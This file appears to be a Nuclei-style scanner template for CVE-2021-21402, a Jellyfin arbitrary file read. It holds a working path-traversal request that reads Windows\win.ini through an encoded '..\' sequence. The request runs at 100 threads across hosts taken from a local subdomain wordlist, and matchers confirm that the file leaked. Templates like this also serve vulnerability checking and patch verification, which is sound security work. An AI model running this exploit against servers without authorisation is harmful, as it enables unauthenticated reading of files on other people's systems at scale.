id: CVE-2021-21402 2
info:
  author: dwisiswant0
  description: 'Jellyfin allows unauthenticated arbitrary file read. This issue is
    more prevalent when

    Windows is used as the host OS. Servers that are exposed to the public Internet
    are

    potentially at risk. This is fixed in version 10.7.1.

    '
  name: Jellyfin prior to 10.7.0 Unauthenticated Arbitrary File Read
  reference: https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/
  severity: high
  tags: cve,cve2021,jellyfin,lfi
requests:
- attack: sniper
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - 'Content-Type: application/octet-stream'
  - part: body
    regex:
    - \[(font|extension|file)s\]
    type: regex
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/
    HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/89.0.4389.114 Safari/537.36

    '
  threads: 100
